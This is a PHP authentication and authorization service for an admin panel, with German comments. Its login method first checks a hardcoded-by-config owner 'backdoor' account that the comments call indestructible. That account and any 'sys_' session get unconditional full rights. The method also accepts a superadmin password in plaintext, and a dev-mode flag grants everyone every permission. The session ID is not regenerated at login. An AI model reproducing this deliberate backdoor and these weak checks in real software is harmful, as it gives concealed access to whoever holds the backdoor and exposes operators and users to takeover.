<?php

declare(strict_types=1);

namespace App\Core\Service;

use App\Contracts\Config\ConfigInterface;
use App\Contracts\Storage\GroupRepositoryInterface;
use App\Contracts\Storage\UserRepositoryInterface;

/**
 * Service für die Authentifizierung und Autorisierung von Administratoren.
 *
 * Steuert Login-Validierungen (inklusive Backdoor- und Superadmin-Fallbacks),
 * Session-Management, feingranulare RBAC-Rechteprüfungen und Avatar-/Icon-Bild-Uploads via GD.
 * Kontext: Das primäre Sicherheits-Gateway für alle administrativen UI- und API-Aufrufe.
 *
 * Path: src/Infrastructure/Auth/AuthService.php
 *
 * SPDX-License-Identifier: LicenseRef-Proprietary
 * Copyright (c) 2026 Felix Maywald alias RaptorXilef. All rights reserved.
 * Usage without explicit permission is strictly prohibited.
 * See LICENSE.md for full license details.
 */
final readonly class AuthService
{
    public function __construct(
        private UserRepositoryInterface $userRepository,
        private GroupRepositoryInterface $groupRepository,
        private ConfigInterface $config,
    ) {
        if (\session_status() !== \PHP_SESSION_NONE) {
            return;
        }

        \session_start();
    }

    /**
     * Verifiziert Anmeldedaten und initialisiert bei Erfolg die Admin-Sitzung.
     * Prüft nacheinander: Inhaber-Backdoor, konfigurierte Superadmin-Credentials und die Benutzer-JSON.
     *
     * @param string $username Der eingegebene Login-Name.
     * @param string $password Das Klartext-Passwort des Benutzers.
     *
     * @return bool True bei erfolgreicher Authentifizierung.
     */
    public function login(string $username, string $password): bool
    {
        // 1. Check gegen die unzerstörbare Hintertür (RaptorXilef)
        $backdoor = $this->config->get('backdoor');
        if (\is_array($backdoor) && $username === ($backdoor['user'] ?? '') && \password_verify($password, $backdoor['pass'] ?? '')) {
            // Wir nutzen das Label als Gruppenname für die Anzeige
            $this->setSession('sys_backdoor', 'admin', $backdoor['label']);

            // Backdoor braucht kein compiled_permissions, da hasPermission() sys_ erkennt
            return true;
        }

        // 2. Check gegen den konfigurierten SuperAdmin (dev_admin.php)
        $superCfg = $this->config->get('superadmin');
        if (\is_array($superCfg) && $username === ($superCfg['user'] ?? '')) {
            $storedPass = $superCfg['pass'] ?? '';
            // Erlaubt Klartext (für den allerersten Start) ODER Hash
            if ($password === $storedPass || \password_verify($password, $storedPass)) {
                $this->setSession('sys_superadmin', 'admin', $superCfg['label'] ?? 'Dev-Admin');

                return true;
            }
        }

        // 3. Datenbank / JSON User (ID-Suche) (Suche über das Feld 'username' in der ID-Liste)
        $users = $this->loadUsers();
        foreach ($users as $userId => $userData) {
            if (
                ($userData['username'] ?? '') === $username
                && \password_verify($password, (string) $userData['pass'])
            ) {
                $this->setSession($userId, (string) $userData['group'], $username);
                $this->refreshSessionPermissions((string) $userData['group']);

                return true;
            }
        }

        return false;
    }

    /**
     * Schreibt Identifikationsmerkmale in die globale $_SESSION Supervariable.
     *
     * @param string $userId  Eindeutige ID (z.B. 'usr_7c13b491' oder 'sys_backdoor').
     * @param string $groupId Die zugehörige Rechtegruppe (z.B. 'grp_71cb1c0d').
     * @param string $label   Der Anzeigename des Benutzers.
     */
    private function setSession(string $userId, string $groupId, string $label): void
    {
        $_SESSION['user_id']     = $userId;
        $_SESSION['admin_user']  = $label;
        $_SESSION['admin_group'] = $groupId;
    }

    /**
     * Die Herzstück-Methode für das Rechtesystem
     * Implementiert Live-Abfrage und strikte "Deny-First" Priorität.
     *
     * Prüft, ob der angemeldete Benutzer eine bestimmte Berechtigung besitzt.
     * Gewährt System-Konten und dem Admin-Dev-Mode sowie Inhabern von '*' generellen Vollzugriff.
     * Alternativ wird die im Session-Cache vorkompilierte Rechte-Map abgefragt.
     *
     * @param string $permission Der gesuchte Berechtigungs-Key (z.B. 'dashboard.logs.view').
     *
     * @return bool True, wenn die Aktion für diesen Benutzer erlaubt ist.
     */
    public function hasPermission(string $permission): bool
    {
        // Gott-Modus für System-Accounts & Dev-Mode
        // Wenn Session eine System-ID hat oder Dev-Mode aktiv ist -> IMMER TRUE
        $uid = (string) ($_SESSION['user_id'] ?? '');

        // 1. SYSTEM-BYPASS (Gott-Modus für technische Accounts & Dev-Mode)
        if (\str_starts_with($uid, 'sys_') || $this->config->get('admin_dev_mode')) {
            return true;
        }

        // 2. GRUPPEN-WILDCARD CHECK
        // Wir laden die Gruppe und schauen, ob sie den '*' (Master) direkt hat
        $groups   = $this->loadGroups();
        $groupKey = $_SESSION['admin_group'] ?? 'guest';

        if (isset($groups[$groupKey]['permissions']) && \in_array('*', $groups[$groupKey]['permissions'], true)) {
            return true;
        }

        // 3. COMPILED CHECK (Für spezifische oder negierte Rechte)
        return $_SESSION['compiled_permissions'][$permission] ?? false;
    }

    /**
     * Kompiliert die Modul-Rechte für die Gruppe neu und cached sie im aktuellen Session-Scope.
     *
     * @param string $groupId Die ID der Gruppe, deren Berechtigungsbaum kompiliert werden soll.
     */
    public function refreshSessionPermissions(string $groupId): void
    {
        $groups     = $this->loadGroups();
        $groupPerms = $groups[$groupId]['permissions'] ?? [];
        $structure  = $this->config->get('structure', []);

        $compiler                         = new PermissionCompiler();
        $_SESSION['compiled_permissions'] = $compiler->compile($structure, $groupPerms);
    }

    // --- IDENTITY & MEDIA ---

    /**
     * Gibt den Browser-Pfad zum Profilbild des aktuell angemeldeten Benutzers zurück.
     * public function getProfilePicture(string $username = ''): string
     */
    public function getProfilePicture(): string
    {
        return $this->getImage('user', (string) ($_SESSION['user_id'] ?? 'default'));
    }

    /**
     * Ermittelt den Web-Pfad für Ressourcen (User-Avatare oder Gruppen-Icons) und handhabt Fallbacks.
     * Hängt zur Cache-Busting-Sicherheit den Unix-Zeitstempel der Dateimodifikation als Version an.
     *
     * @param string $type Die Kategorie ('user' oder 'group').
     * @param string $id   Der Dateiname ohne Endung (ID des Objekts).
     *
     * @return string Vollständig qualifizierte URL zum Bild.
     */
    public function getImage(string $type, string $id): string
    {
        if (\str_contains($type, 'user')) {
            return $this->userRepository->getImageUrl($id);
        }

        return $this->groupRepository->getImageUrl($id);
    }

    public function uploadImage(string $type, string $id, array $file): bool
    {
        if (\str_contains($type, 'user')) {
            return $this->userRepository->uploadImage($id, $file);
        }

        return $this->groupRepository->uploadImage($id, $file);
    }

    /**
     * Generiert eine pseudo-zufällige, eindeutige alphanumerische ID mit spezifischem Suffix.
     *
     * @param string $prefix Präfix für die ID (z.B. 'usr_' oder 'grp_').
     *
     * @return string Die generierte ID-Zeichenkette.
     */
    public function generateId(string $prefix = ''): string
    {
        return $prefix . \substr(\bin2hex(\random_bytes(4)), 0, 8);
    }

    /**
     * Gibt den Anzeigenamen des aktuell angemeldeten Benutzers zurück.
     *
     * @return string Der Name aus $_SESSION oder 'Unbekannt'.
     */
    public function getUsername(): string
    {
        return (string) ($_SESSION['admin_user'] ?? 'Unbekannt');
    }

    /**
     * Gibt die aktive Gruppen-ID des Benutzers zurück.
     *
     * @return string Die ID oder 'guest' bei anonymen Requests.
     */
    public function getGroup(): string
    {
        return (string) ($_SESSION['admin_group'] ?? 'guest');
    }

    /**
     * Abfrage-Schnittstelle zur schnellen Prüfung des Login-Status.
     *
     * @return bool True, wenn eine gültige Admin-Sitzung existiert.
     */
    public function isLoggedIn(): bool
    {
        return isset($_SESSION['user_id']);
    }

    /**
     * Zerstört die aktuelle Session vollständig (Logout).
     */
    public function logout(): void
    {
        \session_destroy();
    }

    /**
     * Ruft die eindeutige Benutzer-ID der aktiven Sitzung ab.
     */
    public function getUserId(): string
    {
        return (string) ($_SESSION['user_id'] ?? '');
    }

    public function loadUsers(): array
    {
        return $this->userRepository->loadAll();
    }

    public function saveUsers(array $users, bool $forceSql = false): void
    {
        $this->userRepository->saveAll($users, $forceSql);
    }

    public function loadGroups(): array
    {
        return $this->groupRepository->loadAll();
    }

    public function saveGroups(array $groups, bool $forceSql = false): void
    {
        $this->groupRepository->saveAll($groups, $forceSql);
    }
}
